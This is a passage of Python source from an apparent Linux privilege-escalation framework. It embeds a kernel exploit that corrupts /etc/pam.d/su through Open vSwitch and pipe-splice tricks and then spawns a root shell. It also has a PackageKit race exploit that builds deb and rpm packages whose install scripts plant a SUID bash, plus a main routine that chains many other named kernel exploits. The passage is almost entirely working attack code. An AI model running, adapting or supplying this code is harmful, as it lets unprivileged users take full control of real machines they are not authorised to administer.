                replies.append(body)
            if replies and not flags & NLM_F_ACK:
                return replies

    def family(self, name: str) -> int:
        replies = self.request(
            GENL_ID_CTRL,
            CTRL_CMD_GETFAMILY,
            2,
            nla(CTRL_ATTR_FAMILY_NAME, cstr(name)),
            NLM_F_REQUEST,
        )
        for reply in replies:
            for attr_type, payload in parse_attrs(reply[4:]):
                if attr_type == CTRL_ATTR_FAMILY_ID:
                    return struct.unpack_from("H", payload, 0)[0]
        raise RuntimeError(f"generic-netlink family not found: {name}")


@dataclass
class Topology:
    tun_fd: int
    genl: GenericNetlink
    flow_family: int
    datapath_ifindex: int


KERNELS = (
    KernelRecord(
        "Fedora Linux 44 (Server Edition)",
        "6.19.10-300.fc44.x86_64",
        "#1 SMP PREEMPT_DYNAMIC Wed Mar 25 18:23:49 UTC 2026",
        "x86_64",
        False,
    ),
    KernelRecord(
        "Ubuntu 24.04.4 LTS",
        "6.17.0-40-generic",
        "#40~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue Jun 23 16:48:12 UTC 2",
        "x86_64",
        True,
    ),
)


def step(message: str) -> None:
    print(f"\n***{message}***", flush=True)


def align4(value: int) -> int:
    return (value + 3) & ~3


def nla(attr_type: int, payload: bytes) -> bytes:
    length = 4 + len(payload)
    return (
        struct.pack(NLA_HDR, length, attr_type)
        + payload
        + b"\x00" * (align4(length) - length)
    )


def cstr(value: str) -> bytes:
    return value.encode("ascii") + b"\x00"


def parse_attrs(data: bytes) -> list[tuple[int, bytes]]:
    attrs: list[tuple[int, bytes]] = []
    offset = 0
    while offset + 4 <= len(data):
        length, attr_type = struct.unpack_from(NLA_HDR, data, offset)
        if length < 4 or length > len(data) - offset:
            break
        attrs.append((attr_type, data[offset + 4 : offset + length]))
        offset += align4(length)
    return attrs


def run(command: list[str]) -> None:
    subprocess.run(
        command,
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def open_tun(name: str) -> int:
    fd = os.open("/dev/net/tun", os.O_RDWR | os.O_CLOEXEC)
    request = struct.pack("16sH22x", name.encode("ascii"), IFF_TUN)
    fcntl.ioctl(fd, TUNSETIFF, request)
    return fd


def create_netkit(name: str, headroom: int) -> None:
    ifinfo = struct.pack("=BBHiII", socket.AF_UNSPEC, 0, 0, 0, 0, 0xFFFFFFFF)
    info_data = (
        nla(IFLA_NETKIT_MODE, struct.pack("I", NETKIT_L2))
        + nla(IFLA_NETKIT_HEADROOM, struct.pack("H", headroom))
    )
    linkinfo = nla(IFLA_INFO_KIND, cstr("netkit")) + nla(IFLA_INFO_DATA, info_data)
    payload = ifinfo + nla(IFLA_IFNAME, cstr(name)) + nla(IFLA_LINKINFO, linkinfo)
    header = struct.pack(
        NLMSG_HDR,
        16 + len(payload),
        RTM_NEWLINK,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_EXCL | NLM_F_CREATE,
        1,
        0,
    )
    sock = socket.socket(
        socket.AF_NETLINK,
        socket.SOCK_RAW | socket.SOCK_CLOEXEC,
        socket.NETLINK_ROUTE,
    )
    try:
        sock.send(header + payload)
        reply = sock.recv(65_535)
    finally:
        sock.close()
    if len(reply) < 20 or struct.unpack_from("H", reply, 4)[0] != NLMSG_ERROR:
        raise RuntimeError("invalid rtnetlink reply")
    error = struct.unpack_from("i", reply, 16)[0]
    if error:
        raise OSError(-error, os.strerror(-error))


def create_datapath(genl: GenericNetlink, family: int, name: str) -> None:
    payload = (
        struct.pack("i", 0)
        + nla(OVS_DP_ATTR_NAME, cstr(name))
        + nla(OVS_DP_ATTR_UPCALL_PID, struct.pack("I", 0))
    )
    genl.request(
        family,
        OVS_DP_CMD_NEW,
        OVS_DATAPATH_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def create_vport(
    genl: GenericNetlink,
    family: int,
    datapath_ifindex: int,
    name: str,
    port: int,
) -> None:
    payload = (
        struct.pack("i", datapath_ifindex)
        + nla(OVS_VPORT_ATTR_PORT_NO, struct.pack("I", port))
        + nla(OVS_VPORT_ATTR_TYPE, struct.pack("I", OVS_VPORT_TYPE_NETDEV))
        + nla(OVS_VPORT_ATTR_NAME, cstr(name))
        + nla(OVS_VPORT_ATTR_UPCALL_PID, struct.pack("I", 0))
    )
    genl.request(
        family,
        OVS_VPORT_CMD_NEW,
        OVS_VPORT_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def flow_key() -> tuple[bytes, bytes]:
    key = (
        nla(OVS_KEY_ATTR_IN_PORT, struct.pack("I", 1))
        + nla(OVS_KEY_ATTR_ETHERTYPE, struct.pack("!H", ETH_P_IPV6))
        + nla(OVS_KEY_ATTR_IPV6, b"\x00" * 40)
    )
    mask = (
        nla(OVS_KEY_ATTR_IN_PORT, struct.pack("I", 0xFFFFFFFF))
        + nla(OVS_KEY_ATTR_ETHERTYPE, struct.pack("!H", 0xFFFF))
        + nla(OVS_KEY_ATTR_IPV6, b"\x00" * 40)
    )
    return key, mask


def create_flow(topology: Topology, actions: bytes) -> None:
    key, mask = flow_key()
    payload = (
        struct.pack("i", topology.datapath_ifindex)
        + nla(OVS_FLOW_ATTR_KEY, key)
        + nla(OVS_FLOW_ATTR_MASK, mask)
        + nla(OVS_FLOW_ATTR_ACTIONS, actions)
    )
    topology.genl.request(
        topology.flow_family,
        OVS_FLOW_CMD_NEW,
        OVS_FLOW_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def new_topology(
    tun_fd: int,
    datapath: str,
    ports: tuple[str, ...],
    mtu: int | None = None,
) -> Topology:
    genl = GenericNetlink.open()
    datapath_family = genl.family("ovs_datapath")
    vport_family = genl.family("ovs_vport")
    flow_family = genl.family("ovs_flow")
    create_datapath(genl, datapath_family, datapath)
    datapath_ifindex = socket.if_nametoindex(datapath)
    if mtu is not None:
        run(["/usr/sbin/ip", "link", "set", datapath, "mtu", str(mtu)])
    for port_number, name in enumerate(ports, 1):
        create_vport(genl, vport_family, datapath_ifindex, name, port_number)
    return Topology(tun_fd, genl, flow_family, datapath_ifindex)


def setup_factory(prefix: str) -> tuple[int, int, Topology]:
    input_name = f"{prefix}in"
    output_name = f"{prefix}out"
    datapath_name = f"{prefix}dp"
    input_fd = open_tun(input_name)
    output_fd = open_tun(output_name)
    run(["/usr/sbin/ip", "link", "set", input_name, "mtu", "4000"])
    run(["/usr/sbin/ip", "link", "set", output_name, "mtu", "4000"])
    run(["/usr/sbin/ip", "link", "set", input_name, "up"])
    run(["/usr/sbin/ip", "link", "set", output_name, "txqueuelen", "8192"])
    run(["/usr/sbin/ip", "link", "set", output_name, "up"])
    topology = new_topology(
        input_fd,
        datapath_name,
        (input_name, output_name),
        4_000,
    )
    create_flow(topology, nla(OVS_ACTION_ATTR_OUTPUT, struct.pack("I", 2)))
    return input_fd, output_fd, topology


def masked_ipv6_action(value: bytes) -> bytes:
    field = value + b"\x00" * (40 - len(value))
    mask = b"\xff" * len(value) + b"\x00" * (40 - len(value))
    return nla(
        OVS_ACTION_ATTR_SET_MASKED,
        nla(OVS_KEY_ATTR_IPV6, field + mask),
    )


def setup_exploit(index: int, pages: int) -> Topology:
    tun_name = f"ei{index}"
    netkit_name = f"en{index}"
    vxlan_name = f"ev{index}"
    datapath_name = f"ed{index}"
    local = f"172.{77 + index}.0.1"
    tun_fd = open_tun(tun_name)
    run(["/usr/sbin/ip", "link", "set", tun_name, "up"])
    create_netkit(
        netkit_name,
        pages * 4_096
        + PIPE_FLAGS_OFFSET
        - VXLAN_HEADROOM
        - IPV6_SOURCE_OFFSET,
    )
    run(["/usr/sbin/ip", "addr", "add", f"{local}/24", "dev", netkit_name])
    run(["/usr/sbin/ip", "link", "set", netkit_name, "up"])
    run(
        [
            "/usr/sbin/ip",
            "link",
            "add",
            vxlan_name,
            "type",
            "vxlan",
            "id",
            str(3_777 + index),
            "local",
            local,
            "dev",
            netkit_name,
            "dstport",
            "4789",
        ]
    )
    run(["/usr/sbin/ip", "link", "set", vxlan_name, "up"])
    topology = new_topology(
        tun_fd,
        datapath_name,
        (tun_name, vxlan_name),
    )
    create_flow(topology, masked_ipv6_action(b"\x10"))
    return topology


def ipv6_packet(length: int) -> bytes:
    payload_length = length - 40
    source = socket.inet_pton(socket.AF_INET6, "2001:db8::2")
    destination = socket.inet_pton(socket.AF_INET6, "2001:db8::1")
    header = struct.pack(
        "!IHBB16s16s",
        6 << 28,
        payload_length,
        59,
        64,
        source,
        destination,
    )
    return struct.pack("!HH", 0, ETH_P_IPV6) + header + b"A" * payload_length


def create_cg_drain() -> list[tuple[socket.socket, socket.socket]]:
    drain: list[tuple[socket.socket, socket.socket]] = []
    for _index in range(CG_DRAIN_PAIRS):
        sender, receiver = socket.socketpair(socket.AF_UNIX, socket.SOCK_DGRAM)
        drain.append((sender, receiver))
    return drain


def fill_cg_drain(
    drain: list[tuple[socket.socket, socket.socket]],
    packet: bytes,
) -> None:
    for sender, _receiver in drain:
        for _message in range(CG_DRAIN_MESSAGES):
            if sender.send(packet) != len(packet):
                raise RuntimeError("short cache-drain datagram")


def build_pipe_groups(
    anchor_input: int,
    target_fd: int,
    target_offset: int,
    packet: bytes,
) -> list[list[tuple[int, int]]]:
    pipe_groups: list[list[tuple[int, int]]] = []
    for group_index in range(PIPE_GROUPS):
        for _index in range(ANCHORS_PER_GROUP):
            if os.write(anchor_input, packet) != len(packet):
                raise RuntimeError("short anchor TUN write")
        pipes: list[tuple[int, int]] = []
        for _index in range(PIPES_PER_GROUP):
            read_fd, write_fd = os.pipe2(os.O_CLOEXEC)
            fcntl.fcntl(write_fd, F_SETPIPE_SZ, PIPE_SIZE)
            if os.splice(target_fd, write_fd, 1, target_offset - 1) != 1:
                raise RuntimeError("short splice into pipe")
            pipes.append((read_fd, write_fd))
        pipe_groups.append(pipes)
        if group_index + 1 < PIPE_GROUPS:
            for _index in range(ANCHORS_PER_GROUP):
                if os.write(anchor_input, packet) != len(packet):
                    raise RuntimeError("short separator TUN write")
    return pipe_groups


def try_pipe_groups(
    pipe_groups: list[list[tuple[int, int]]],
    warmup_input: int,
    anchor_output: int,
    exploits: list[Topology],
    hole_packet: bytes,
) -> bool:
    trigger_packet = ipv6_packet(52)
    for group_index, pipes in enumerate(pipe_groups):
        if group_index:
            for _index in range(ANCHORS_PER_GROUP):
                os.read(anchor_output, 65_535)
            for _index in range(RECYCLE_DRAIN):
                if os.write(warmup_input, hole_packet) != len(hole_packet):
                    raise RuntimeError("short recycle-drain TUN write")
        for _index in range(ANCHORS_PER_GROUP):
            os.read(anchor_output, 65_535)
        for exploit in exploits:
            if os.write(exploit.tun_fd, trigger_packet) != len(trigger_packet):
                raise RuntimeError("short exploit TUN write")
        for _read_fd, write_fd in pipes:
            if os.write(write_fd, PAM_REPLACEMENT) != len(PAM_REPLACEMENT):
                raise RuntimeError("short pipe write")
            if PAM_REPLACEMENT in Path(PAM_TARGET).read_bytes():
                return True
    return False


def close_pipe_groups(pipe_groups: list[list[tuple[int, int]]]) -> None:
    for pipes in pipe_groups:
        for read_fd, write_fd in pipes:
            os.close(read_fd)
            os.close(write_fd)


def convert(
    warmup_input: int,
    anchor_input: int,
    anchor_output: int,
    exploits: list[Topology],
    hole_packet: bytes,
) -> int:
    target_offset = Path(PAM_TARGET).read_bytes().index(PAM_ORIGINAL)
    target_fd = os.open(PAM_TARGET, os.O_RDONLY | os.O_CLOEXEC)
    cg_drain = create_cg_drain()

    for _phase in range(CONVERSION_PHASES):
        for _index in range(WARMUP_COUNT):
            if os.write(warmup_input, hole_packet) != len(hole_packet):
                raise RuntimeError("short warmup TUN write")
        fill_cg_drain(cg_drain, hole_packet)
        pipe_groups = build_pipe_groups(
            anchor_input,
            target_fd,
            target_offset,
            hole_packet,
        )
        if try_pipe_groups(
            pipe_groups,
            warmup_input,
            anchor_output,
            exploits,
            hole_packet,
        ):
            return 0
        close_pipe_groups(pipe_groups)
    return 1


def internal_attempt() -> int:
    os.sched_setaffinity(0, {0})
    run(["/usr/sbin/ip", "link", "set", "lo", "up"])
    warmup_input, _warmup_output, _warmup = setup_factory("wf")
    anchor_input, anchor_output, _anchor = setup_factory("af")
    exploits = [
        setup_exploit(index, pages)
        for index, pages in enumerate(CANDIDATE_PAGES)
    ]

    hole_packet = ipv6_packet(HOLE_PACKET_LENGTH)

    return convert(
        warmup_input,
        anchor_input,
        anchor_output,
        exploits,
        hole_packet,
    )


def os_release() -> dict[str, str]:
    try:
        lines = Path("/etc/os-release").read_text(encoding="utf-8").splitlines()
    except OSError:
        return {}

    values: dict[str, str] = {}
    for line in lines:
        key, separator, value = line.partition("=")
        if not separator:
            continue
        value = value.strip()
        if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
            value = value[1:-1]
        values[key] = value
    return values


def current_kernel() -> KernelRecord:
    uname = os.uname()
    release = os_release()
    return KernelRecord(
        release.get("PRETTY_NAME", "Unknown distribution"),
        uname.release,
        uname.version,
        uname.machine,
        release.get("ID") == "ubuntu",
    )


def describe(record: KernelRecord) -> str:
    return f"{record.distro}, kernel {record.release} ({record.machine})"


def direct_user_namespace_available() -> bool:
    result = subprocess.run(
        ["/usr/bin/unshare", "-Urn", "/usr/bin/true"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0


def run_attempt(record: KernelRecord) -> int:
    environment = os.environ.copy()
    environment[INTERNAL_ENV] = "1"
    child = [sys.executable, str(Path(__file__).resolve())]
    command = ["/usr/bin/unshare", "-Urn", *child]
    if record.trinity:
        if direct_user_namespace_available():
            print("namespace: direct unshare -Urn works", flush=True)
        else:
            print(
                "namespace: direct unshare -Urn denied; using aa-exec -p trinity",
                flush=True,
            )
            command = ["/usr/bin/aa-exec", "-p", "trinity", "--", *command]
    return subprocess.run(command, env=environment, check=False).returncode


def main() -> int:
    record = current_kernel()
    if record not in KERNELS:
        raise RuntimeError("distro/kernel build does not match either tested target")
    if os.environ.get(INTERNAL_ENV) == "1":
        return internal_attempt()
    if os.geteuid() == 0:
        raise RuntimeError("run this PoC as an ordinary unprivileged user")

    step("CHECKING TARGET")
    print(f"target: {describe(record)}", flush=True)
    target = Path(PAM_TARGET).read_bytes()
    if PAM_REPLACEMENT in target:
        raise RuntimeError(f"{PAM_TARGET} is already modified")
    if PAM_ORIGINAL not in target:
        raise RuntimeError(f"expected PAM module is absent from {PAM_TARGET}")

    step("BEGINNING ROOT CONVERSION")
    if run_attempt(record) != 0:
        raise RuntimeError("root conversion did not land")
    if PAM_REPLACEMENT not in Path(PAM_TARGET).read_bytes():
        raise RuntimeError("conversion child reported success without a root-owned write")

    step("SPAWNING INTERACTIVE ROOT SHELL")
    os.execv("/usr/bin/su", ["su", "-", "root"])


if __name__ == "__main__":
    raise SystemExit(main())
'''
def _cve_2026_81000_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _check_pam_su_patched_m15():
    """Cek apakah /etc/pam.d/su sudah dipatch ke pam_permit.so (M15)."""
    try:
        with open("/etc/pam.d/su", "rb") as f:
            content = f.read()
        return b"pam_permit.so" in content
    except (OSError, PermissionError):
        return False


def _cve_2026_81000_run():
    """Tulis source Python TUNderflow ke file temp, jalankan sebagai subprocess."""
    tag = "%08x" % (os.getpid() ^ int(time.time()))
    py_path = "/tmp/.tun_%s.py" % tag

    try:
        with open(py_path, "w") as f:
            f.write(CVE_2026_81000_C_SOURCE)
        os.chmod(py_path, 0o755)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[+] wrote: %s (%d bytes)" % (py_path, len(CVE_2026_81000_C_SOURCE)))

    log("[*] running TUNderflow (timeout 600s)...")
    try:
        p = subprocess.Popen(
            [sys.executable, py_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        try:
            out, _ = p.communicate(timeout=600)
            rc = p.returncode
        except subprocess.TimeoutExpired:
            p.kill()
            try:
                p.communicate(timeout=5)
            except Exception:
                pass
            log("[-] timeout")
            _cve_2026_81000_cleanup(py_path)
            return False

        if out:
            for line in out.splitlines()[-40:]:
                log("    %s" % line)
    except Exception as e:
        log("[-] run error: %s" % e)
        _cve_2026_81000_cleanup(py_path)
        return False

    _cve_2026_81000_cleanup(py_path)

    if _check_pam_su_patched_m15():
        return True
    if os.geteuid() == 0:
        return True
    if rc == 0:
        return True
    return False


def try_cve_2026_81000():
    log("\n[=== METHOD 15: CVE-2026-81000 (TUNderflow) ===]")

    # 1. cek sudah root
    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    # 2. cek sudah patched
    if _check_pam_su_patched_m15():
        log("[+] /etc/pam.d/su already patched — su root")
        auto_root_su("root")
        return True

    # 3. cek arsitektur
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    # 4. cek target file
    if not os.path.isfile("/etc/pam.d/su"):
        log("[-] /etc/pam.d/su not found")
        return False
    try:
        with open("/etc/pam.d/su", "rb") as f:
            content = f.read()
        if b"pam_rootok.so" not in content:
            log("[-] pam_rootok.so not found in /etc/pam.d/su")
            return False
    except (OSError, PermissionError) as e:
        log("[-] /etc/pam.d/su not readable: %s" % e)
        return False

    # 5. cek /dev/net/tun
    if not os.path.exists("/dev/net/tun"):
        log("[-] /dev/net/tun not found")
        return False

    # 6. cek OVS module
    if not os.path.isdir("/sys/module/openvswitch"):
        qrun(["modprobe", "openvswitch"], timeout=3)
        if not os.path.isdir("/sys/module/openvswitch"):
            log("[-] openvswitch module not available")
            return False
    log("[+] openvswitch loaded")

    # 7. cek tools
    for tool in ("/usr/sbin/ip", "/usr/bin/unshare"):
        if not os.path.isfile(tool):
            log("[-] required tool missing: %s" % tool)
            return False

    # 8. cek kernel record match (opsional — kalau tidak match, tetap coba)
    uname = os.uname()
    log("[*] kernel: %s %s" % (uname.release, uname.machine))

    # 9. run
    if _cve_2026_81000_run():
        log("[+++] TUNderflow succeeded — /etc/pam.d/su patched")
        auto_root_su("root")
        return True

    log("[-] TUNderflow failed")
    return False

#METHOD_16_DISINI

# ──────────────────────────────────────────────────
# METHOD 20: Pack2TheRoot (PackageKit TOCTOU)
# ──────────────────────────────────────────────────

def try_pack2root():
    log("\n[=== METHOD 20: Pack2TheRoot (PackageKit TOCTOU) ===]")

    dbus_ok = any(os.path.exists(p) for p in
                  ["/var/run/dbus/system_bus_socket", "/run/dbus/system_bus_socket"])
    if not dbus_ok:
        log("[-] System D-Bus not found")
        return False

    pkg = None
    if shutil.which("dpkg-deb"):
        pkg = "deb"
    elif shutil.which("rpmbuild"):
        pkg = "rpm"
    elif shutil.which("ar"):
        pkg = "deb_ar"

    if not pkg:
        log("[-] No package tools")
        return False

    log("[+] D-Bus OK, packages: %s" % pkg)

    fired = False
    for name, fn in [("gdbus", _pk_gdbus), ("busctl", _pk_busctl)]:
        log("[*] Trying %s..." % name)
        try:
            if fn(pkg):
                fired = True
                break
        except Exception as e:
            log("  [-] %s: %s" % (name, e))

    if not fired:
        log("[-] All PackageKit methods failed")
        return False

    log("[*] Waiting for SUID binary", end="")
    for i in range(240):
        if os.path.exists(PK_SUID):
            try:
                st = os.stat(PK_SUID)
                if st.st_mode & 0o4000:
                    log("\n[+++] SUID bash: %s" % PK_SUID)
                    _reattach_tty()
                    os.execl(PK_SUID, PK_SUID, "-p", "-c",
                             "exec python3 -c 'import os;os.setuid(0);os.setgid(0);"
                             "os.execl(\"/bin/bash\",\"bash\")'")
                    return True
            except OSError:
                pass
        if i % 2 == 0:
            log(".", end="")
        time.sleep(0.5)

    log("\n[-] Timeout (120s)")
    return False


def _mk_deb_ar(path, name, payload=False):
    w = "/tmp/.b%s%d" % (name, os.getpid())
    os.makedirs(w, exist_ok=True)
    with open("%s/debian-binary" % w, "w") as f:
        f.write("2.0\n")
    cd = "%s/c" % w
    os.makedirs(cd, exist_ok=True)
    with open("%s/control" % cd, "w") as f:
        f.write("Package: %s\nVersion: 1.0\nArchitecture: all\n"
                "Maintainer: x <x@x>\nDescription: u\n" % name)
    if payload:
        pi = "%s/postinst" % cd
        with open(pi, "w") as f:
            f.write("#!/bin/sh\ninstall -m 4755 /bin/bash %s\n" % PK_SUID)
        os.chmod(pi, 0o755)
    subprocess.run(["tar", "czf", "%s/control.tar.gz" % w, "-C", cd, "."],
                   capture_output=True)
    subprocess.run(["tar", "czf", "%s/data.tar.gz" % w, "--files-from", "/dev/null"],
                   capture_output=True)
    if os.path.exists(path):
        os.remove(path)
    r = subprocess.run(
        ["ar", "r", path, "%s/debian-binary" % w,
         "%s/control.tar.gz" % w, "%s/data.tar.gz" % w],
        capture_output=True, cwd=w)
    subprocess.run(["rm", "-rf", w])
    return r.returncode == 0


def _mk_deb(path, name, payload=False):
    d = "/tmp/.b%s%d" % (name, os.getpid())
    dd = "%s/DEBIAN" % d
    os.makedirs(dd, exist_ok=True)
    with open("%s/control" % dd, "w") as f:
        f.write("Package: %s\nVersion: 1.0\nArchitecture: all\n"
                "Maintainer: x <x@x>\nDescription: u\n" % name)
    if payload:
        pi = "%s/postinst" % dd
        with open(pi, "w") as f:
            f.write("#!/bin/sh\ninstall -m 4755 /bin/bash %s\n" % PK_SUID)
        os.chmod(pi, 0o755)
    r = subprocess.run(["dpkg-deb", "-b", d, path], capture_output=True)
    subprocess.run(["rm", "-rf", d])
    return r.returncode == 0


def _mk_rpm(path, name, payload=False):
    w = "/tmp/.r%s%d" % (name, os.getpid())
    for d in ["SPECS", "SOURCES", "BUILD", "RPMS", "SRPMS"]:
        os.makedirs("%s/%s" % (w, d), exist_ok=True)
    spec = ("Name: %s\nVersion: 1.0\nRelease: 1\nSummary: u\n"
            "License: MIT\nBuildArch: noarch\n\n%%description\nu\n\n" % name)
    if payload:
        spec += "%%post\ninstall -m 4755 /bin/bash %s\n\n" % PK_SUID
    spec += "%files\n"
    with open("%s/SPECS/%s.spec" % (w, name), "w") as f:
        f.write(spec)
    r = subprocess.run(
        ["rpmbuild", "-bb", "--define", "_topdir %s" % w,
         "%s/SPECS/%s.spec" % (w, name)], capture_output=True)
    if r.returncode == 0:
        import glob
        rpms = glob.glob("%s/RPMS/**/*.rpm" % w, recursive=True)
        if rpms:
            shutil.copy2(rpms[0], path)
            subprocess.run(["rm", "-rf", w])
            return True
    subprocess.run(["rm", "-rf", w])
    return False


def _mk_pkg(path, name, pkg, payload=False):
    if pkg == "deb":
        return _mk_deb(path, name, payload)
    elif pkg == "deb_ar":
        return _mk_deb_ar(path, name, payload)
    elif pkg == "rpm":
        return _mk_rpm(path, name, payload)
    return False


def _pk_gdbus(pkg):
    if not shutil.which("gdbus"):
        return False

    ext = ".deb" if pkg != "rpm" else ".rpm"
    dp = "/tmp/.d%d%s" % (os.getpid(), ext)
    pp = "/tmp/.p%d%s" % (os.getpid(), ext)

    if not _mk_pkg(dp, "d", pkg, False) or not _mk_pkg(pp, "p", pkg, True):
        for f in [dp, pp]:
            try:
                os.remove(f)
            except OSError:
                pass
        return False

    try:
        r = subprocess.run(
            ["gdbus", "call", "--system", "--dest", "org.freedesktop.PackageKit",
             "--object-path", "/org/freedesktop/PackageKit",
             "--method", "org.freedesktop.PackageKit.CreateTransaction"],
            capture_output=True, text=True, timeout=10)
        if r.returncode != 0:
            return False
        tid = r.stdout.strip().strip("()'\" ,")
        if "/" not in tid:
            return False

        p1 = subprocess.Popen(
            ["gdbus", "call", "--system", "--dest", "org.freedesktop.PackageKit",
             "--object-path", tid, "--method",
             "org.freedesktop.PackageKit.Transaction.InstallFiles",
             "uint64 4", "['%s']" % dp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(
            ["gdbus", "call", "--system", "--dest", "org.freedesktop.PackageKit",
             "--object-path", tid, "--method",
             "org.freedesktop.PackageKit.Transaction.InstallFiles",
             "uint64 0", "['%s']" % pp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p1.wait(timeout=15)
        p2.wait(timeout=15)
    except Exception as e:
        log("  [-] gdbus error: %s" % e)
        return False
    return True


def _pk_busctl(pkg):
    if not shutil.which("busctl"):
        return False

    ext = ".deb" if pkg != "rpm" else ".rpm"
    dp = "/tmp/.d%d%s" % (os.getpid(), ext)
    pp = "/tmp/.p%d%s" % (os.getpid(), ext)

    if not _mk_pkg(dp, "d", pkg, False) or not _mk_pkg(pp, "p", pkg, True):
        for f in [dp, pp]:
            try:
                os.remove(f)
            except OSError:
                pass
        return False

    try:
        r = subprocess.run(
            ["busctl", "call", "org.freedesktop.PackageKit",
             "/org/freedesktop/PackageKit",
             "org.freedesktop.PackageKit", "CreateTransaction"],
            capture_output=True, text=True, timeout=10)
        if r.returncode!= 0:
            return False
        tid = r.stdout.strip().split('"')[1] if '"' in r.stdout else None
        if not tid:
            return False

        p1 = subprocess.Popen(
            ["busctl", "call", "org.freedesktop.PackageKit", tid,
             "org.freedesktop.PackageKit.Transaction", "InstallFiles",
             "tas", "4", "1", dp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(
            ["busctl", "call", "org.freedesktop.PackageKit", tid,
             "org.freedesktop.PackageKit.Transaction", "InstallFiles",
             "tas", "0", "1", pp],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p1.wait(timeout=15)
        p2.wait(timeout=15)
    except Exception as e:
        log("  [-] busctl error: %s" % e)
        return False
    return True

# ──────────────────────────────────────────────────
# FUNGSI RECORN
# ──────────────────────────────────────────────────
def recon_summary():
    uname = os.uname()
    C = Color

    # ── OS ──
    os_name = "Unknown"
    try:
        with open("/etc/os-release", "r") as f:
            for line in f:
                if line.startswith("PRETTY_NAME="):
                    os_name = line.split("=", 1)[1].strip().strip('"')
                    break
    except OSError:
        try:
            with open("/etc/redhat-release", "r") as f:
                os_name = f.read().strip()
        except OSError:
            os_name = "%s %s" % (uname.sysname, uname.release)

    # ── Kernel ──
    kernel = uname.release or "Unknown"

    # ── Architecture ──
    arch = uname.machine or "Unknown"

    # ── User ──
    try:
        uid = os.getuid()
        try:
            username = pwd.getpwuid(uid).pw_name
        except (KeyError, AttributeError):
            username = os.environ.get("USER", "unknown")
        user_info = "%s (uid=%d)" % (username, uid)
    except Exception:
        user_info = "unknown"

    # ── Print ──
    log(C.CYAN + "[*]" + C.RESET + " " + C.BOLD_WHITE + "System Information:" + C.RESET)
    log("    " + C.RED + "OS           " + C.RESET + C.WHITE + ": " + os_name + C.RESET)
    log("    " + C.RED + "Kernel       " + C.RESET + C.WHITE + ": " + kernel + C.RESET)
    log("    " + C.RED + "Architecture " + C.RESET + C.WHITE + ": " + arch + C.RESET)
    log("    " + C.RED + "User         " + C.RESET + C.WHITE + ": " + user_info + C.RESET)
    log(C.BOLD_CYAN + "=" * 55 + C.RESET)

# ──────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────

def main():
    C = Color
    log(C.BOLD_CYAN + "=" * 55 + C.RESET)
    log(C.BOLD_CYAN + "  SuperSmoky & Leviathan Perfect Hunter" + C.RESET)
    log(C.BOLD_CYAN + "  Linux Privilege Escalation Framework v9.1" + C.RESET)
    log(C.BOLD_CYAN + "=" * 55 + C.RESET)
    log(C.CYAN + "[*]" + C.RESET + " " + C.WHITE + "uid=%d euid=%d pid=%d" % (os.getuid(), os.geteuid(), os.getpid()) + C.RESET)

    uname = os.uname()
    log(C.CYAN + "[*]" + C.RESET + " " + C.WHITE + "Python %s | %s %s | %s" % (
        sys.version.split()[0], uname.sysname, uname.release, uname.machine) + C.RESET)

    # ── System Information ──
    try:
        recon_summary()
    except Exception as e:
        log("[!] recon failed: %s" % e)

    if os.geteuid() == 0:
        log("[+] Already root!")
        _reattach_tty()
        os.execl("/bin/bash", "bash")
        return

    # Pre-flight: CopyFail prerequisites
    cf_ok = False
    if socket is not None:
        if not init_splice():
            log("[-] splice() unavailable")
        else:
            stype = "native" if hasattr(os, 'splice') else "ctypes"
            log("[+] splice: %s" % stype)
            algo = find_algo()
            if not algo:
                log("[-] No authencesn algo — CopyFail M1/M2 disabled")
            else:
                log("[+] algo: %s" % algo)
                cf_ok = True
    else:
        log("[-] socket module unavailable")

    # Kernel gate: CopyFail family (M1/M2/M3)
    # M1: /etc/passwd UID flip
    if cf_ok:
        try:
            if try_passwd_flip():
                return
        except SystemExit:
            raise
        except Exception as e:
            log("[-] M1 error: %s: %s" % (type(e).__name__, e))

    # M2: CopyFail binary mutation
    if cf_ok:
        try:
            if try_binary_mutation():
                return
        except SystemExit:
            raise
        except Exception as e:
            log("[-] M2 error: %s: %s" % (type(e).__name__, e))

    # M3: DirtyCBC binary mutation (RxGK)
    try:
        if try_dirtycbc():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M3 error: %s: %s" % (type(e).__name__, e))

    # M4: DirtyFrag
    try:
        if try_dirtyfrag():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M4 error: %s: %s" % (type(e).__name__, e))

    # M5: CVE-2026-43503 DirtyClone
    try:
        if try_cve_2026_43503():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M5 error: %s: %s" % (type(e).__name__, e))

    # M6: CVE-2026-64600 (RefluXFS)
    try:
        if try_cve_2026_64600():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M6 error: %s: %s" % (type(e).__name__, e))

    # M7: CVE-2026-46242 (Bad Epoll)
    try:
        if try_cve_2026_46242():
            return
    except SystemExit:
        raise
    except Exception as e:
        log("[-] M7 error: %s: %s" % (type(e).__name__, e))

    # M8: CVE-2026-46331 (act_pedit partial-COW)
    try:
        if try_cve_2026_46331():
            return
